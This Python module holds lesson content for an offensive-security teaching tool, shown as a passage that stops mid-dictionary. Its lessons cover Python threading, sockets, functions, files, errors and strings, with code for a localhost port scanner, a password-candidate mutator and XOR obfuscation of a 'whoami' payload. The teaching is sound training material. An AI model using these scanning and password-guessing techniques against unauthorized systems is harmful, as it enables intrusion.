#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║         ERR0RS ULTIMATE — EXPANDED TEACH ENGINE                 ║
║              src/core/teach_engine.py                           ║
║                                                                  ║
║  Rich per-tool AND per-concept lessons covering:                 ║
║    Tools: nmap, nikto, gobuster, sqlmap, hydra, nuclei,         ║
║           whatweb, enum4linux, crackmapexec, ffuf, metasploit,  ║
║           bloodhound, hashcat, volatility, wireshark, burp,     ║
║           impacket, responder, mimikatz, linpeas, netcat        ║
║    Concepts: CIS Controls 1-18, OWASP Top 10, MITRE ATT&CK      ║
║              Kill Chain, CIA Triad, threat modeling, IR phases  ║
║                                                                  ║
║  Author: Gary Holden Schneider (Eros) | GitHub: Gnosisone       ║
╚══════════════════════════════════════════════════════════════════╝
"""

LESSONS = {
    "python-threading": {
        "summary": "Concurrency for I/O-bound tools — concurrent.futures.ThreadPoolExecutor to scan hundreds of ports at once. Turns a minutes-long scan into seconds, and explains why the GIL doesn't get in the way here",
        "mental_model": (
            "A single-threaded scanner waits on each port's timeout one at a time: 1000 ports x up to 1s each can "
            "be 15+ minutes — and the whole time the CPU is idle, just WAITING on the network. Threads let you "
            "have hundreds of sockets waiting simultaneously. Python's GIL means threads don't speed up CPU work "
            "(only one thread runs Python bytecode at a time), but port scanning is I/O-bound — you're blocked on "
            "the network, not computing — so threads are exactly right. ThreadPoolExecutor manages a pool of "
            "workers: you hand it the port list, it runs scan_port across the pool, you collect the open ones. "
            "Same logic as before, ~100x faster."
        ),
        "analogy": (
            "Single-threaded scanning is one phone: dial an extension, wait for it to ring out, then dial the "
            "next. Threading is a call-center floor with 200 operators all dialing at once. The work — waiting "
            "for a ring — is identical; you just do it in parallel. The GIL is the house rule 'only one operator "
            "may do arithmetic at the desk at a time' — irrelevant here, because they're all just holding phones, "
            "not doing math."
        ),
        "zoom": {
            "eli5": "Doing one slow thing at a time is slow when each thing is mostly waiting. Threads let your program wait on hundreds of network connections at once, so a scan that took minutes takes seconds.",
            "operator": "from concurrent.futures import ThreadPoolExecutor. with ThreadPoolExecutor(max_workers=100) as ex: ex.map(fn, items). Great for I/O-bound work (network, disk). Tune max_workers (50-200 for scanning). Use as_completed() if you want results the instant each finishes.",
            "deep": "The GIL serializes Python bytecode, so threads do NOT speed up CPU-bound work (hashing, crypto) — for that use multiprocessing or a C-extension tool. But blocking I/O (socket connect, recv, file reads) RELEASES the GIL, so threads overlap their waits and scale well. ThreadPoolExecutor.map preserves input order; submit()+as_completed() yields finishers first. Sharing mutable state across threads needs a lock or a queue.Queue — or, cleaner, just return values and let the executor collect them (what the demo does).",
        },
        "typical": "with ThreadPoolExecutor(max_workers=100) as ex:  results = ex.map(scan, ports)",
        "syntax": {
            "from concurrent.futures import ThreadPoolExecutor":"The high-level thread pool — almost always what you want.",
            "ThreadPoolExecutor(max_workers=N)":"A pool of N worker threads; tune N (50-200 for scanning).",
            "ex.map(fn, items)":   "Run fn over every item across the pool; returns results in input order.",
            "ex.submit(fn, x)":    "Schedule one call; returns a Future you can collect later.",
            "as_completed(futures)":"Iterate Futures in the order they FINISH (live results, not input order).",
            "with ... as ex:":     "The 'with' block waits for all workers to finish before exiting.",
        },
        "code": """import socket
from concurrent.futures import ThreadPoolExecutor

def scan_port(host, port, timeout=0.5):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(timeout)
        return port if s.connect_ex((host, port)) == 0 else None

# throwaway listener so the demo is reproducible
srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(('127.0.0.1', 9999)); srv.listen(1)

ports = range(9990, 10000)                 # scan 10 ports
with ThreadPoolExecutor(max_workers=50) as ex:
    results = ex.map(lambda p: scan_port('127.0.0.1', p), ports)

open_ports = sorted(p for p in results if p is not None)
print("open:", open_ports)                 # open: [9999]
srv.close()
""",
        "notes": [
            "Threads speed up I/O-bound work (network, disk) because blocking calls release the GIL. They do NOT speed up CPU-bound work (hashing, cracking) — use multiprocessing or a dedicated tool (hashcat) for that.",
            "ex.map() returns results in INPUT order and waits for all; submit()+as_completed() gives you each result the moment it finishes — better for a live 'found open port!' feed.",
            "Tune max_workers: too few and you're slow, too many and you exhaust file descriptors / hammer the target for no extra speed. 50-200 is a sane scanning range.",
            "Let the executor collect return values instead of appending to a shared list from threads — it sidesteps race conditions. If you MUST share state, use threading.Lock or queue.Queue.",
            "This is the same parallelism real scanners use; nmap/masscan go further with asynchronous raw packets, but the I/O-overlap idea is identical.",
        ],
        "caution": "More workers = more simultaneous connections = a louder scan that can overwhelm a fragile target or trip rate-limit/IDS alarms. Throttle the pool size, and only scan what you're authorized to.",
        "exercise": "Thread scan_host over range(1, 1025). Time it against the single-threaded version with time.time() and print the speedup factor. Bonus: switch to submit()+as_completed() and print each open port the instant it's found.",
        "next": [
            "python-argparse (give your now-fast scanner a real CLI)",
            "python-requests (HTTP layer once you've found web ports)",
            "python-subprocess (or just wrap and parse nmap itself)",
            "nmap (compare your scanner's speed to the production tool)",
        ],
        "try_cmd": "python3",
    },
    "python-sockets": {
        "summary": "Building an actual TCP port scanner — socket(), settimeout(), connect_ex(), and the connect-scan technique. This is where functions + files + errors converge into a working tool: nmap's baby brother in ~15 lines",
        "mental_model": (
            "A socket is your program's phone line to a host:port. A TCP 'connect scan' just tries to complete "
            "the 3-way handshake: if the connect succeeds the port is OPEN, if it's actively refused the port is "
            "CLOSED, if it hangs until your timeout it's FILTERED (a firewall silently dropping you). "
            "connect_ex() is the scanner's friend — it returns an error code (0 == success/open) instead of "
            "raising, so you don't need a try/except around every port. The one non-negotiable: set a timeout, or "
            "a single filtered host hangs your whole scan forever. Loop the ports, collect the open ones, write "
            "them to loot. That's nmap -sT, demystified."
        ),
        "analogy": (
            "A socket is dialing a phone number (the host) at a specific extension (the port). OPEN = someone "
            "picks up. CLOSED = an instant 'this extension is not in service' click (the refusal). FILTERED = it "
            "just rings and rings forever because a firewall ate your call. A port scan is speed-dialing every "
            "extension in the building and writing down who answers."
        ),
        "zoom": {
            "eli5": "A socket is how your program talks to another computer over the network. To scan a port you try to connect: if it answers, it's open; if it slams the door, it's closed; if it ignores you, a firewall is blocking it.",
            "operator": "s = socket.socket(); s.settimeout(1); rc = s.connect_ex((host, port)); rc == 0 means OPEN. ALWAYS settimeout or filtered hosts hang you. Wrap the socket in 'with' so it closes. This is a connect scan (-sT) — full handshake, no root needed but it IS logged by the target.",
            "deep": "socket(AF_INET, SOCK_STREAM) = IPv4 TCP. connect_ex returns an errno (0 ok, 111 ECONNREFUSED = closed, timeout raises socket.timeout) — connect() instead RAISES, which is why scanners prefer connect_ex. A full TCP connect (-sT) completes the handshake and is logged; a SYN/half-open scan (nmap -sS) sends SYN, reads SYN-ACK, never ACKs — stealthier but needs raw sockets (root). Speed comes from concurrency: hundreds of sockets in threads (concurrent.futures) since each one is I/O-bound waiting on the network.",
        },
        "typical": "s = socket.socket(); s.settimeout(1); open = s.connect_ex((host, port)) == 0",
        "syntax": {
            "socket.socket()":     "Create a TCP/IPv4 socket (defaults: AF_INET, SOCK_STREAM).",
            "s.settimeout(1)":     "MANDATORY for scanning — cap the wait so filtered ports don't hang you.",
            "s.connect_ex((h,p))": "Try to connect; returns 0 if OPEN, an error code otherwise (does NOT raise).",
            "s.connect((h,p))":    "Like connect_ex but RAISES on failure — wrap in try/except if you use it.",
            "with socket.socket() as s:":"Auto-close the socket when the block ends (no leaked file descriptors).",
            "s.recv(1024)":        "Read up to 1024 bytes back — grab a service banner after connecting.",
        },
        "code": """import socket

def scan_port(host, port, timeout=1.0):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(timeout)              # never skip this
        return s.connect_ex((host, port)) == 0   # 0 == open

# stand up a throwaway listener so this demo is reproducible
srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(('127.0.0.1', 9999)); srv.listen(1)

for p in (9999, 9998):
    state = 'open' if scan_port('127.0.0.1', p) else 'closed'
    print(f"127.0.0.1:{p:<5} {state}")
srv.close()
# 127.0.0.1:9999  open
# 127.0.0.1:9998  closed
""",
        "notes": [
            "ALWAYS s.settimeout(...) before connecting — without it, one firewalled (filtered) port hangs your scan indefinitely. 0.5-1.0s is a sane LAN default.",
            "connect_ex() returns 0 for open and an error number otherwise — that's why scanners use it instead of connect(), which raises and forces a try/except on every port.",
            "This is a TCP CONNECT scan (nmap -sT): it finishes the full handshake, needs no root, but completes a real connection that the target logs. A SYN scan (-sS) is stealthier but needs raw sockets/root.",
            "Speed = concurrency. Port scanning is I/O-bound (you're waiting on the network), so threading hundreds of sockets with concurrent.futures.ThreadPoolExecutor turns minutes into seconds — that's the next lesson's payoff.",
            "After connect, s.recv(1024) often returns a service banner (SSH/FTP/HTTP version) — that's banner grabbing, the bridge from 'port open' to 'what's running there'.",
        ],
        "caution": "Port scanning is an active, logged action. Scan only hosts you own or have explicit written authorization to test — a connect scan completes real connections that show up in the target's logs.",
        "exercise": "Turn scan_port into scan_host(host, ports) that returns a list of the open ports. Feed it range(1, 1025) against a box you own (or 127.0.0.1) and print only the open ones. Bonus 1: read the port list from a file (python-files). Bonus 2: after a successful connect, s.recv(1024) and print the banner.",
        "next": [
            "python-threading (make this scanner 100x faster with concurrent.futures)",
            "python-requests (move up to the HTTP layer once you find port 80/443)",
            "python-argparse (give your scanner a real CLI: scan.py --host x --ports 1-1024)",
            "nmap (the production tool you just reimplemented the core of)",
        ],
        "try_cmd": "python3",
    },
    "python-functions": {
        "summary": "Packaging logic into reusable, named tools — def, parameters, return, default arguments, *args/**kwargs, and import. The jump from 'a script that does one thing' to 'a toolkit you call again and again'",
        "mental_model": (
            "A function is a named, reusable block: give it inputs (parameters), it does work and hands back a "
            "result (return). The moment your scanner logic lives in scan(host) instead of being copy-pasted, "
            "you can call it in a loop over 1000 hosts, import it into another tool, and test it in isolation. "
            "Default arguments (timeout=3) make functions flexible without forcing every caller to specify "
            "everything; *args/**kwargs let a function accept any number of inputs. Functions are how a pile of "
            "one-off lines becomes a library you build on."
        ),
        "analogy": (
            "A function is a custom tool you forge once and hang on the wall. The first time you write 'grab a "
            "banner from a host' you're machining the tool; every call after is just reaching for it. A script "
            "without functions does every job freehand each time; a script with them is a workbench of "
            "labelled, reusable instruments."
        ),
        "zoom": {
            "eli5": "A function is a chunk of code with a name. You feed it inputs and it gives back a result. Write it once, use it everywhere — that's how you stop copy-pasting and start building real tools.",
            "operator": "def name(params): ... return result. Use default args (timeout=3) for optional knobs, keyword args at the call site for clarity (scan(host, timeout=5)), and import to pull functions from another file/library. Group related functions into a module = your own tool library.",
            "deep": "Parameters are local to the function (scope); assigning a name inside makes it local unless declared global/nonlocal. *args collects extra positional args into a tuple, **kwargs extra keyword args into a dict — how wrappers pass things through. Functions are first-class: store them in a dict (a tool->function dispatch table), pass them, return them. return ends the function and hands back a value (None if omitted). Default args evaluate ONCE at definition — never use a mutable default like [].",
        },
        "typical": "def scan(host, ports=(22, 80, 443), timeout=3):   # reusable, with sane defaults",
        "syntax": {
            "def f(a, b):":        "Define a function with parameters a and b.",
            "return x":            "Hand a value back to the caller (ends the function; None if omitted).",
            "f(1, b=2)":           "Call it; b=2 is a keyword argument — clearer at the call site.",
            "def f(x, n=3):":      "Default argument — callers may omit n (never default to a mutable like []).",
            "*args / **kwargs":    "Collect extra positional args (tuple) / extra keyword args (dict) — for wrappers.",
            "from mod import f":   "Import a function from another file/module — reuse across tools.",
            "docstring":           "First line inside a function = its help text; shows in help(f).",
        },
        "code": """def mutate(word, years=(2024, 2025), leet=True):
    '''Generate password candidates from a base word.'''
    out = [word, word.capitalize()]
    for y in years:
        out.append(f"{word}{y}")        # admin2024
        out.append(f"{word}{y}!")       # admin2024!
    if leet:
        out.append(word.replace('a', '@').replace('o', '0'))
    return out

# call with defaults; override a knob by keyword if you want
for w in ('admin', 'root'):
    print(w, '->', mutate(w))
# admin -> ['admin', 'Admin', 'admin2024', 'admin2024!', 'admin2025', 'admin2025!', '@dmin']
# root  -> ['root', 'Root', 'root2024', 'root2024!', 'root2025', 'root2025!', 'r00t']
""",
        "notes": [
            "Default args make functions flexible: def scan(host, timeout=3) — callers override only when needed (scan(h, timeout=10)).",
            "NEVER use a mutable default like def f(x, acc=[]) — it's created ONCE and shared across calls (a classic bug). Use acc=None then acc = acc or [] inside.",
            "return hands a value back AND ends the function; with no return you get None. A scanner function should return its findings so the caller can collect them.",
            "Put related functions in a .py file and 'from mytools import scan' elsewhere — that file is now your reusable module/library.",
            "*args/**kwargs let one function pass arguments straight through to another — the pattern behind wrappers and decorators.",
        ],
        "exercise": "Write port_state(port) that returns 'privileged' for ports < 1024 and 'high' otherwise. Then write scan(host, ports=(22,80,443)) that loops the ports and prints each with its state, using port_state. Call it for two hosts. Bonus: override the default 'ports' on one call.",
        "next": [
            "python-files (read wordlists / write results from your functions)",
            "python-errors (make your functions survive bad input)",
            "python-sockets (wrap a real connection in a scan() function)",
            "python-collections (return findings as a dict/list)",
        ],
        "try_cmd": "python3",
    },
    "python-files": {
        "summary": "Reading and writing files the Pythonic way — open with a 'with' block, iterate huge wordlists line-by-line without blowing your RAM, and write loot/results to disk. The bridge between your tools and rockyou.txt",
        "mental_model": (
            "Files are how tools get input (a wordlist, a target list, a captured log) and save output (results, "
            "loot, a report). The key Python idea is 'with open(...) as f': it opens the file, gives you a "
            "handle, and GUARANTEES it closes even if your code errors. The second key idea: iterating a file "
            "object ('for line in f') reads it lazily, line-by-line — so you can loop a 14-million-line wordlist "
            "on a Pi without loading it all into memory. Read mode 'r', write 'w' (truncates!), append 'a'. "
            "That's most of file work in offensive tooling."
        ),
        "analogy": (
            "A file handle is like checking out a case file from records. The 'with' block is signing it out and "
            "being forced to sign it back in when you leave the room — no forgotten open files, no locks left "
            "dangling. Reading line-by-line is reading one page at a time instead of photocopying all 14 million "
            "pages onto your desk at once."
        ),
        "zoom": {
            "eli5": "Files let tools read input (a password list) and save output (results). Python's 'with open' safely opens and closes them, and you can read a giant file one line at a time so it doesn't fill up memory.",
            "operator": "with open(path) as f: for line in f: ... reads lazily (huge-file safe). open(path, 'w') writes (truncates), 'a' appends. .strip() each line to drop the trailing newline. Use absolute paths. For binary (pcap, images) use 'rb'/'wb'.",
            "deep": "open() returns a file object; the 'with' context manager calls .close() on exit even on exception — never leak handles. Iterating the object streams via a buffer, so memory stays flat regardless of size — essential for wordlists. Modes: r/w/a (+ '+' read-write, 'b' binary, 'x' exclusive-create). Text mode decodes with an encoding (default utf-8); pass encoding=/errors= for messy data, or open 'rb' for raw bytes. pathlib.Path is the modern path API.",
        },
        "typical": "with open('rockyou.txt') as f:    # iterate a huge wordlist, line by line",
        "syntax": {
            "with open(p) as f:":  "Open p and auto-close it when the block ends (even on error). The safe way.",
            "for line in f:":      "Iterate a file line-by-line WITHOUT loading it all into RAM (huge-file safe).",
            "open(p, 'w') / 'a'":  "Write mode ('w' TRUNCATES the file) / append mode (adds to the end).",
            "f.read() / readlines()":"Whole file as one string / as a list of lines (loads it all — careful on big files).",
            "line.strip()":        "Drop leading/trailing whitespace incl. the trailing newline from a line.",
            "open(p, 'rb')":       "Binary mode — raw bytes, for pcaps, images, firmware, non-text files.",
        },
        "code": """# write 'results' out (one host per line)
with open('/tmp/loot.txt', 'w') as f:          # 'w' creates/truncates
    for host in ['10.0.0.5', '10.0.0.6']:
        f.write(f"{host}:open\\n")              # remember the newline

# read it back line-by-line (this scales to rockyou.txt)
with open('/tmp/loot.txt') as f:
    for line in f:
        host, state = line.strip().split(':')  # strip drops the \\n
        print(host, '->', state)               # 10.0.0.5 -> open

# count lines WITHOUT loading the whole file into memory
with open('/tmp/loot.txt') as f:
    print('lines:', sum(1 for _ in f))         # lines: 2
""",
        "notes": [
            "'for line in f' is the single most important file pattern in offensive Python: it streams a wordlist line-by-line so a 14M-line rockyou.txt uses almost no RAM — vital on a Pi.",
            "'w' mode TRUNCATES the file to empty before writing — if you meant to add, use 'a' (append). This eats data if you forget.",
            "Always .strip() lines you read — they carry a trailing newline that breaks comparisons (admin-newline != admin).",
            "The 'with' block guarantees the file closes even if your code crashes mid-loop — never go back to bare open()/close().",
            "Text mode assumes utf-8 and chokes on binary or odd encodings; open 'rb' for raw bytes (pcaps, firmware) or pass errors='ignore' for messy logs.",
        ],
        "exercise": "Write load_words(path) that returns a list of stripped lines (skip blanks). Make a small file with a few passwords, load it, print how many you got. Bonus: write a results file where each line is 'host,port,open' and read it back splitting on ','.",
        "next": [
            "python-errors (handle a missing file without crashing)",
            "python-functions (wrap file loading in a reusable loader)",
            "python-sockets (feed the wordlist into a real login attempt)",
            "hashcat (the wordlists you're now loading)",
        ],
        "caution": "Only read/write files you're authorized to touch, and treat loot you pull (creds, configs, captures) as sensitive — it often contains real personal data.",
        "try_cmd": "python3",
    },
    "python-errors": {
        "summary": "Writing tools that don't fall over — try/except/finally, specific exception types, and the discipline that lets one dead host or one bad line not crash your whole scan. The difference between a script and a tool",
        "mental_model": (
            "In the real world things fail: a host is down, a connection times out, a line is malformed, a file "
            "is missing. Without error handling the FIRST failure crashes your entire scan and you lose all "
            "progress. try/except lets you attempt something risky and gracefully handle the failure — log it, "
            "skip it, retry it — and keep going. The pattern at the heart of every robust scanner: 'try to "
            "connect; except (timeout, refused): mark it closed and continue to the next target.' Catching the "
            "RIGHT exception (not a blanket except) means you handle expected failures while real bugs still "
            "surface."
        ),
        "analogy": (
            "Error handling is the seatbelt and crumple zones of your code. You don't expect a crash on every "
            "host, but when one comes — a refused connection, a garbled response — you want the tool to absorb it "
            "and keep driving, not wrap itself around the first pole. A bare 'except:' is airbags that also "
            "deploy when you tap the brakes: it hides problems you needed to see."
        ),
        "zoom": {
            "eli5": "Things go wrong: hosts are down, input is bad. try/except lets your program attempt something, catch the failure if it happens, and keep running instead of crashing. That's what makes a tool reliable.",
            "operator": "Wrap the risky line in try:, catch the SPECIFIC exception in except SomeError:, and continue/log/retry. Use finally: for cleanup that must always run (close sockets/files). In a scan loop, except the connection errors and 'continue' so one dead host doesn't kill the run.",
            "deep": "Exceptions are objects in a hierarchy (ConnectionRefusedError < OSError < Exception). Catch the narrowest type that fits; 'except Exception' is broad and bare 'except:' even catches Ctrl-C and hides bugs — avoid both. except (A, B): catches multiple; 'as e' binds the object for logging. else: runs if no exception; finally: ALWAYS runs (cleanup). raise re-raises or raises your own (raise ValueError('bad target')). Common in tooling: TimeoutError, ConnectionRefusedError, FileNotFoundError, ValueError, KeyError.",
        },
        "typical": "try: connect()  except (ConnectionRefusedError, TimeoutError): continue   # one dead host -> next",
        "syntax": {
            "try: ... except E:":   "Attempt the block; if exception E fires, run the except block instead of crashing.",
            "except (A, B) as e:":  "Catch multiple exception types; 'as e' gives you the object to log.",
            "finally:":             "Cleanup that ALWAYS runs (close sockets/files) whether or not there was an error.",
            "else:":                "Runs only if the try block raised NO exception.",
            "raise ValueError(m)":  "Signal your own error (or bare 'raise' to re-throw the current one).",
            "continue":             "In a loop's except, skip the failed item and move on (dead host -> next host).",
        },
        "code": """# bad input shouldn't crash the loop -- catch the SPECIFIC error and skip
for p in ['22', '80', 'oops', '443']:
    try:
        port = int(p)                      # ValueError if not a number
    except ValueError:
        print(f"skip bad port: {p!r}")     # skip bad port: 'oops'
        continue
    print(f"would scan port {port}")

# catch a specific failure; finally always runs (put cleanup there)
def safe_div(a, b):
    try:
        return a / b
    except ZeroDivisionError:
        return None                        # handle the expected failure
    finally:
        pass                               # e.g. close a socket/file here

print(safe_div(10, 2), safe_div(10, 0))    # 5.0 None
""",
        "notes": [
            "Catch SPECIFIC exceptions (except ValueError), never a bare 'except:' — a blanket catch hides real bugs and even swallows Ctrl-C. Name the failures you expect.",
            "The robust-scanner pattern: 'try: connect() / except (ConnectionRefusedError, TimeoutError): continue' — one unreachable host skips, the scan keeps going.",
            "finally: ALWAYS runs (exception or not) — it's where you close sockets and files so a crash doesn't leak resources.",
            "Use 'as e' to log WHAT failed (except OSError as e: log(e)) instead of silently swallowing it — a silent except is how bugs hide for weeks.",
            "raise lets you signal your own errors (raise ValueError('target required')); a bare 'raise' inside an except re-throws the original for the caller to handle.",
        ],
        "exercise": "Wrap an open() in try/except FileNotFoundError so a missing file prints a friendly message instead of crashing. Then loop over a list of 'ip:port' strings, try/except the .split(':')/int(), and 'continue' past malformed lines. Bonus: add a finally that prints 'done' every pass.",
        "next": [
            "python-sockets (where ConnectionRefusedError and timeout actually fire)",
            "python-functions (wrap risky calls in safe, reusable functions)",
            "python-files (handle the missing-file case cleanly)",
            "python-requests (catch HTTP/network errors gracefully)",
        ],
        "try_cmd": "python3",
    },
    # ───────────────────────────────────────────────────────────────────
    # PYTHON FOR PENTESTERS — a real, ordered curriculum that teaches the
    # Python language through an offensive-security lens. Every concept
    # lands on something you'd actually build (scanner, cracker, fuzzer).
    # Code lessons use: mental_model + zoom + syntax + code + notes +
    # exercise (rendered by format_lesson's code-lesson fields).
    # ───────────────────────────────────────────────────────────────────
    "python-intro": {
        "summary": "Why Python is the hacker's first language, and how to actually run it — the REPL for experimenting, scripts for tools, pip for the ecosystem. Your on-ramp before the real lessons",
        "mental_model": (
            "Python is the duct tape of security work: readable enough to learn fast, powerful enough that a "
            "huge share of modern tooling (sqlmap, pwntools, impacket, scapy) is written in or driven by it. You "
            "don't learn Python to admire it — you learn it so that when no existing tool does exactly what you "
            "need, you can build the 20-line script that does. Two ways to run it: the REPL (an interactive "
            "prompt to try one line at a time — your lab bench) and scripts (.py files you save and run — your "
            "tools)."
        ),
        "analogy": (
            "Learning Python for hacking is like a mechanic learning to weld. You're not becoming a "
            "metallurgist — you're gaining the one skill that lets you fabricate the exact bracket the job needs "
            "when the parts store doesn't stock it. Every custom exploit, every glue script between tools, every "
            "parser for weird output is a weld."
        ),
        "zoom": {
            "eli5": "Python is an easy-to-read programming language. You can type one line at a time to test ideas, or save lines as a file and run it as your own little tool. Hackers use it to build exactly what they need.",
            "operator": "Use python3 (the REPL) to prototype a line at a time; save working logic to a .py file and run `python3 tool.py`. Install libraries with `pip install <name>` inside a venv to stay clean. Try-in-REPL, save-to-script, install-a-lib is 90% of the workflow.",
            "deep": "CPython compiles your .py to bytecode then runs it on an interpreter — slower than C, fast to write. The ecosystem (PyPI) is the superpower: requests, scapy, impacket, pwntools. Virtual environments (python3 -m venv) isolate a project's dependencies so a library you install for one engagement doesn't break another; for exploit work you pin versions so a payload stays reproducible.",
        },
        "typical": "python3            # start the REPL    |    python3 myscript.py    # run a script",
        "syntax": {
            "python3":             "Start the interactive REPL — type expressions, see results instantly. Ctrl-D to exit.",
            "python3 file.py":     "Run a saved script.",
            "print(x)":            "Show a value — your basic output and the simplest debugging tool.",
            "# comment":           "Everything after # on a line is ignored — notes to yourself.",
            "pip install <lib>":   "Install a library from PyPI (do it inside a venv to stay clean).",
            "python3 -m venv .venv":"Create an isolated environment; activate with 'source .venv/bin/activate'.",
        },
        "code": """#!/usr/bin/env python3
# tiny_wordlist.py  --  your first 'tool': build candidate passwords
base = "admin"
years = [2023, 2024, 2025]
for y in years:
    print(f"{base}{y}")     # admin2023, admin2024, admin2025
    print(f"{base}{y}!")    # add a trailing !  ->  admin2023!
# Run it:        python3 tiny_wordlist.py
# Save output:   python3 tiny_wordlist.py > words.txt
""",
        "notes": [
            "The REPL is your friend: when unsure what a line does, paste it into python3 and watch. Hackers prototype in the REPL constantly.",
            "Scripts start fresh every run; the REPL remembers everything until you close it. Explore in the REPL, keep in scripts.",
            "Use a venv per project (python3 -m venv .venv) — it stops one tool's library versions from breaking another's. pip installs into the active venv.",
            "Indentation is SYNTAX, not decoration: the spaces under a 'for' or 'if' define the block. Be consistent (4 spaces). This trips up everyone at first.",
            "Call it python3, not python — on Kali and most Linux 'python' may be missing or point elsewhere; 'python3' is the safe call.",
        ],
        "exercise": "Open the REPL (python3) and make it print your name 5 times with a for loop. Then save the tiny_wordlist idea into a file, add a second base word like 'root', and run it piping to a file: python3 tiny_wordlist.py > words.txt. How many lines did you get?",
        "next": [
            "python-basics (variables, numbers, and the all-important str vs bytes)",
            "python-strings (encoding and payload crafting)",
            "the-shell (where you run your scripts)",
            "python-files (read wordlists, write loot)",
        ],
        "try_cmd": "python3",
    },
    "python-basics": {
        "summary": "Python's core data types through a hacker's eyes — and the single most important distinction in offensive Python: str (text) vs bytes (raw data). Get this right and networking, crypto, and exploitation stop fighting you",
        "mental_model": (
            "Everything in Python is an object with a type. The types you'll live in: int (numbers, including hex "
            "like 0x41), str (human text, Unicode), and bytes (raw 8-bit data — what actually travels over "
            "sockets and sits in files). The number-one beginner pain in security Python is mixing str and "
            "bytes: a socket sends bytes, not text; a hash wants bytes; a payload is bytes. You convert with "
            ".encode() (str to bytes) and .decode() (bytes to str). Internalize that one conversion and half "
            "your TypeErrors vanish."
        ),
        "analogy": (
            "str vs bytes is the difference between a sentence and the actual ink-and-paper it's printed on. "
            "Humans read the sentence (str); the network, the disk, and the CPU only ever move the physical "
            "bytes. .encode() prints the sentence onto paper; .decode() reads the paper back into a sentence. "
            "Send paper down a wire, not sentences."
        ),
        "zoom": {
            "eli5": "Python has numbers, text, and raw data. Text (str) is for humans; raw data (bytes, written b'...') is what computers actually send and store. Switch between them with .encode() and .decode(). Mixing them up causes most beginner errors.",
            "operator": "int for counts/ports/hex; str for anything you print or read; bytes for anything you send on a socket, hash, or write to a binary file. Convert at the boundary: text.encode() before sending, data.decode() after receiving real text. XOR and bit ops work on the integer values of the bytes.",
            "deep": "str is a sequence of Unicode code points; bytes is a sequence of ints 0-255. Indexing bytes gives an int (payload[0] -> 119), not a 1-char bytes — a classic gotcha (slice [0:1] for a byte). Encodings (utf-8, latin-1) map str<->bytes; latin-1 is handy in exploitation as a lossless 1:1 byte<->char map. Bitwise ops (^ & | << >>) act on ints, so XOR obfuscation iterates the byte values. Numbers are arbitrary-precision, so big-integer crypto math just works.",
        },
        "typical": "payload = b'whoami'      # bytes literal -- the raw data you'd send",
        "syntax": {
            "int / 0x41 / 0b101":  "Whole numbers; 0x = hex, 0b = binary. ord('A') is 65, chr(65) gives 'A'.",
            "str    'text'":       "Human text (Unicode). f'...' interpolates values into it.",
            "bytes    b'raw'":     "Raw 8-bit data — what sockets, files, and hashes use. Indexing one gives an int.",
            ".encode() / .decode()":"str to bytes / bytes to str. The conversion you will use constantly.",
            "^  &  |  <<  >>":     "Bitwise ops on integers — XOR (^) is the workhorse of simple obfuscation.",
            ".hex() / bytes.fromhex()":"bytes to hex text / hex text to bytes.",
        },
        "code": """# str vs bytes -- the distinction that matters most
text = "whoami"          # str: human text
raw  = text.encode()     # bytes: b'whoami'  (what you'd send on a socket)
print(type(raw).__name__, raw)        # bytes b'whoami'
print(raw[0])                          # 119   <- indexing bytes gives an INT

# XOR 'encryption' (the classic obfuscation trick), byte by byte
key = 0x42
enc = bytes(b ^ key for b in raw)
print(enc, enc.hex())                  # b'5*-#/+' 352a2d232f2b
dec = bytes(b ^ key for b in enc)      # XOR again, same key = original back
print(dec.decode())                    # whoami   (bytes -> str)
""",
        "notes": [
            "Indexing bytes returns an int, not a character: b'whoami'[0] is 119. For a 1-byte slice use b'whoami'[0:1]. This surprises everyone once.",
            "TypeError: can't concat str to bytes? You mixed the two. Pick one side and .encode()/.decode() to match — sockets and hashes want bytes.",
            "XOR with the same key twice returns the original — that's why it's the simplest reversible obfuscation, and why it's weak (key reuse leaks).",
            "Numbers are arbitrary precision: 2**4096 just works, which is why Python is comfortable for crypto and CTF math.",
            "Hex (0x), the .hex() method, and bytes.fromhex() are everywhere in exploitation — addresses, shellcode, and hashes are all hex.",
        ],
        "exercise": "In the REPL: take 'admin', .encode() it, XOR every byte with 0x13, and print the .hex(). Then XOR the result with 0x13 again and .decode() to prove you recovered 'admin'. Bonus: compare b'admin'[0] against b'admin'[0:1] — why are they different types?",
        "next": [
            "python-strings (slicing, f-strings, and base64/hex/url encoding)",
            "python-collections (lists and dicts for wordlists and results)",
            "python-intro (if you skipped the setup)",
            "hashcat (where the bytes-as-hashes idea pays off)",
        ],
        "try_cmd": "python3",
    },
    "python-strings": {
        "summary": "String surgery for offensive work — slicing, splitting, f-string interpolation, and the encodings every hacker lives in: base64, hex, and URL. Where you craft payloads and decode captured data",
        "mental_model": (
            "Half of practical hacking is reshaping text and data: build a URL with an injected parameter, "
            "decode a base64 token from a cookie, hex-encode shellcode, URL-encode a payload so it survives an "
            "HTTP request. Python gives you all of it built in. The mental split: str methods (.split, .strip, "
            ".replace, slicing, f-strings) reshape TEXT; the base64/urllib modules convert BETWEEN human text "
            "and the encoded forms data travels in. Master encode/decode and you stop being blocked by 'why "
            "won't this payload go through?'."
        ),
        "analogy": (
            "Encodings are shipping containers for data. base64 packs raw bytes into a safe alphanumeric box so "
            "they survive systems that choke on binary (cookies, JSON, email). URL-encoding wraps characters so "
            "a payload survives the trip through a URL without being misread as syntax. You're not changing "
            "what's inside — only the container it travels in, so it arrives intact."
        ),
        "zoom": {
            "eli5": "Strings are text you can cut, join, and search. Encodings like base64 and hex repackage data so it can travel safely through web requests, cookies, and JSON. Python does each in one line, so you can build payloads and read back captured data.",
            "operator": "Reshape text with slicing ([start:stop]), .split()/.join(), .replace(), and f-strings for building URLs/requests. Convert with base64.b64encode/decode, .hex()/bytes.fromhex(), and urllib.parse.quote/unquote. Decode tokens you capture; encode payloads you send.",
